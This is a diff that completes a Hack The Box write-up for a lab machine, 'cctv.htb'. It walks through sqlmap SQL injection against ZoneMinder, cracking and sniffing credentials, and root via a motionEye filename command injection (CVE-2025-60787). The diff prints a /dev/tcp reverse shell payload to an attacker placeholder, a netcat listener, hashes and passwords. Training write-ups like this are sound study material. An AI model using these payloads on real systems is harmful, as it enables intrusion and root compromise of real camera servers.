@@ -62,29 +62,17 @@ sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?vie
 ```shell
 sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -D zm --tables --batch
 ```
-**Result**: Key tables we found. `Users`.
+**Result**: Key tables we found. `Users` with `Password` and `Users` columns available.
 
 
-3:
+3: Credential hunting in the `Users` table.
 ```shell
-
+sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' -D zm -T Users -C Username,Password --dump --batch --threads=10 --hex
 ```
+**Result**: We found `Bcrypt` hashes.
+superadmin: `$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm`
+mark: `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`
 
----
-
-## Lateral Movement
-
-<!-- If you needed to pivot between users before privesc -->
-
-### From `user_a` to `user_b`
-
-**Method**: <!-- Credential reuse, hash cracking, readable files, etc. -->
-
-```bash
-# Commands
-```
-
-**User flag**: `/home/<user>/user.txt`
 
 ---
 
@@ -92,76 +80,157 @@ sqlmap --cookie="ZMSESSID=<SESSION_COOKIE>" -u 'http://cctv.htb/zm/index.php?vie
 
 ### Enumeration
 
+After cracking mark's bcrypt hash with hashcat (`opensesame`), SSH access was established:
 ```bash
-sudo -l
-# Always run this first
+ssh mark@cctv.htb
 ```
 
-<!-- What did you find? SUID binaries, writable crons, sudo entries, capabilities? -->
+First step post-foothold was checking internal listening services:
+```bash
+ss -tulnp
+```
+
+This revealed several non-standard ports listening on localhost including `8765` (motionEye) and `7999` (Motion daemon). No user flag was present in mark's home directory and `sudo -l` returned nothing useful.
+
+The next step was sniffing internal traffic to check for cleartext credentials:
+```bash
+tcpdump -i any -nn -A tcp port 5000
+```
+
+**Result:** Cleartext credentials captured from internal traffic:
+
+| Username | Password |
+|----------|----------|
+| sa_mark | `X1l9fx1ZjS7RZb` |
+
+SSH'd in as `sa_mark` and retrieved the user flag.
+
+---
 
 ### Vulnerability
 
-**Type**: <!-- e.g. Sudo misconfiguration, CVE, SUID binary, writable cron -->
-**Why it works**: <!-- Technical explanation -->
+- **Type:** Cleartext credential exposure via internal traffic sniffing + motionEye CVE-2025-60787 command injection
+- **Why it works:** The motionEye service on port 8765 takes user input from the web dashboard and writes it directly into Motion configuration files (`/etc/motioneye/camera-X.conf`) without sanitizing shell characters. When Motion processes the `picture_filename` directive it evaluates shell syntax like `$(command)`. Since the Motion daemon runs as root, injected commands execute with root privileges. The `sa_mark` credentials obtained via tcpdump worked on motionEye's admin interface because ZoneMinder's `AUTH_HASH_LOGINS` config governed the shared auth layer.
+
+---
 
 ### Exploit
 
+**1. Forward internal ports to local machine**
 ```bash
-# Commands
+ssh -L 8765:127.0.0.1:8765 -L 7999:127.0.0.1:7999 mark@<TARGET_IP>
 ```
 
-**Root flag**: `/root/root.txt`
+**2. Set up netcat listener**
+```bash
+nc -lvnp 4444
+```
+
+**3. Login to motionEye**
+
+Navigate to `http://127.0.0.1:8765` and login with:
+- Username: `admin`
+- Password: `X1l9fx1ZjS7RZb`
+
+**4. Bypass client-side JS validation in browser console (F12)**
+```javascript
+configUiValid = function() { return true; };
+```
+
+**5. Inject reverse shell payload into Still Images > Image File Name**
+```
+$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
+```
+
+**6. Set Capture Mode to Interval Snapshots with interval of 10 seconds and trigger snapshot**
+```bash
+curl "http://127.0.0.1:7999/1/action/snapshot"
+```
+
+Shell lands within 10 seconds as root.
+
+**Root flag:**
+```bash
+cat /root/root.txt
+```
 
 ---
 
 ## Rabbit Holes
 
-<!-- What did you waste time on? What looked promising but wasn't? -->
-<!-- This is where the real learning is. Don't skip it. -->
-
--
+- Attempted to crack superadmin and admin bcrypt hashes — neither in rockyou
+- Attempted `--os-shell` via sqlmap — failed due to insufficient MySQL FILE privileges
+- Attempted webshell write via `SELECT INTO OUTFILE` — restricted to `/var/lib/mysql-files/`
+- Attempted to modify ZoneMinder system config as admin — superadmin privileges required
+- Attempted ZoneMinder auth hash login bypass — time-based hash component made it unreliable
+- Spent significant time cracking hashes before pivoting to tcpdump
 
 ---
 
 ## Attack Chain Summary
-
 ```
-Initial access vector
+admin:admin default creds on ZoneMinder web portal
       ↓
-How you got a shell
+Time-based blind SQLi via tid parameter (sqlmap)
       ↓
-Lateral movement (if any)
+Dumped Users table → bcrypt hashes
       ↓
-Privesc method
+Cracked mark's hash (opensesame) → SSH foothold as mark
       ↓
-Root
+tcpdump on port 5000 → cleartext sa_mark credentials
+      ↓
+SSH as sa_mark → user flag
+      ↓
+sa_mark creds reused on motionEye admin (admin:X1l9fx1ZjS7RZb)
+      ↓
+CVE-2025-60787 filename injection → reverse shell as root
+      ↓
+Root flag
 ```
 
 ---
 
 ## Key Learnings
 
-<!-- What would you do differently? What new technique did you learn? -->
-<!-- What will you remember for the next box? -->
-
--
+- Always run `ss -tulnp` immediately after foothold to enumerate internal services
+- Always run `tcpdump` on internal interfaces to hunt for cleartext credentials
+- bcrypt hashes not in rockyou don't mean a dead end — pivot to other attack vectors
+- Client-side JS validation is never a security boundary — always bypassable via browser console
+- Any unsanitized field that reaches a config file executed by a daemon is a potential injection point
+- Session cookies expire during long sqlmap runs — always grab a fresh cookie if you get 401s
 
 ---
 
 ## Commands Reference
-
 ```bash
 # Enumeration
-
+nmap -sC -sV -oA nmap/initial <IP>
+ss -tulnp
+tcpdump -i any -nn -A tcp port 5000
+cat /etc/motioneye/motion.conf
 
 # Exploitation
+sqlmap --cookie="ZMSESSID=<SESSION>" \
+  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
+  --dbs --batch
 
+sqlmap --cookie="ZMSESSID=<SESSION>" \
+  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
+  -D zm --tables --batch
+
+sqlmap --cookie="ZMSESSID=<SESSION>" \
+  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetam&tid=1' \
+  -D zm -T Users -C Username,Password --dump --batch --threads=10 --hex
+
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
 
 # Privilege Escalation
-
+ssh -L 8765:127.0.0.1:8765 -L 7999:127.0.0.1:7999 mark@<TARGET_IP>
+nc -lvnp 4444
+curl "http://127.0.0.1:7999/1/action/snapshot"
 
 # Flags
-cat /home/<user>/user.txt
+cat /home/sa_mark/user.txt
 cat /root/root.txt
 ```
 
@@ -169,4 +238,4 @@ cat /root/root.txt
 
 ## Tags
 
-#htb #easy #linux
+`#htb` `#easy` `#linux` `#sqli` `#sqlmap` `#bcrypt` `#motioneye` `#command-injection` `#tcpdump` `#cleartext-creds` `#cve-2025-60787`
